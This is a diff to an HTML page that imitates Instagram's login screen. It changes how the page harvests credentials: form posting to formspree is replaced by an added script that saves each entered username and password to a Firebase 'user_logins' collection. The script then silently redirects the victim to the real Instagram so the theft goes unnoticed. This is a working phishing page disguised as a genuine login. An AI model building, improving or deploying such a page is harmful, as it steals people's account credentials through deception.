@@ -14,7 +14,6 @@
   </head>
   <body>
     <div id="login-container">
-      <!-- Phone image -->
       <div id="phone-img-container">
         <img
           src="./images/home-phones-2x.png"
@@ -24,9 +23,8 @@
         <img src="./images/screenshot1-2x.png" id="screenshot" />
       </div>
 
-      <!-- Login -->
       <div id="login-right">
-        <form id="inputs_form" action="https://formspree.io/f/mpqbvbye" method="POST">
+        <form id="inputs_form">
           <img
             src="./images/instagram-text-icon.png"
             alt="logo"
@@ -35,13 +33,20 @@
           <div id="inputs_div">
             <input
               type="text"
-              name = "Name"
+              id="username_input"
               class="input"
               placeholder="Phone number, username, or email"
+              required
             />
-            <input type="password" name = "Pass" class="input" placeholder="Password" />
+            <input 
+              type="password" 
+              id="password_input" 
+              class="input" 
+              placeholder="Password" 
+              required 
+            />
           </div>
-          <button>Log in</button>
+          <button type="submit">Log in</button>
 
           <div id="or-div">
             <div class="or-line"></div>
@@ -49,14 +54,14 @@
             <div class="or-line"></div>
           </div>
         </form>
-          <div id="fb-text">
-            <span>
-              <img src="./images/facebook.png" id="fb-logo" />
-            </span>
-            <span>Log in with Facebook</span>
-          </div>
-          <p id="forgot-password">Forgot password?</p>
-        </form>
+
+        <div id="fb-text">
+          <span>
+            <img src="./images/facebook.png" id="fb-logo" />
+          </span>
+          <span>Log in with Facebook</span>
+        </div>
+        <p id="forgot-password">Forgot password?</p>
 
         <div id="no-acct">
           <p>Don't have an account? <a href="https://google.com" target="_blank" id="sign-up">Sign up</a></p>
@@ -77,7 +82,6 @@
       </div>
     </div>
 
-    <!-- For footer -->
     <footer>
       <div class="footer-div">
         <p>Meta</p>
@@ -100,5 +104,49 @@
         <p>© 2025 Instagram from Meta</p>
       </div>
     </footer>
+
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+      import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+      // ⚠️ REPLACE THIS CONFIG OBJECT WITH YOUR ACTUAL COPIED FIREBASE CONFIG ⚠️
+      const firebaseConfig = {
+        apiKey: "AIzaSyAhKzDb1IYss2lBlKoZOZiVOxlH5MG7zgw",
+        authDomain: "insta-d88d2.firebaseapp.com",
+        projectId: "insta-d88d2",
+        storageBucket: "insta-d88d2.firebasestorage.app",
+        messagingSenderId: "91809005466",
+        appId: "1:91809005466:web:84bee9d38516a180098423"
+      };
+
+      // Initialize Firebase and Firestore
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      // Listen for form submission
+      document.getElementById('inputs_form').addEventListener('submit', async function(event) {
+        event.preventDefault(); // Stop page from refreshing
+
+        // Grab inputs
+        const username = document.getElementById('username_input').value;
+        const password = document.getElementById('password_input').value;
+
+        try {
+          // Add data to a collection named "user_logins"
+          await addDoc(collection(db, "user_logins"), {
+            Name: username,
+            Pass: password,
+            timestamp: serverTimestamp()
+          });
+
+          // Redirect to the real Instagram on success
+          window.location.href = "https://www.instagram.com";
+        } catch (error) {
+          console.error("Error saving data to Firebase: ", error);
+          // Force redirect even if it errors out so the user experience doesn't break
+          window.location.href = "https://www.instagram.com";
+        }
+      });
+    </script>
   </body>
 </html>
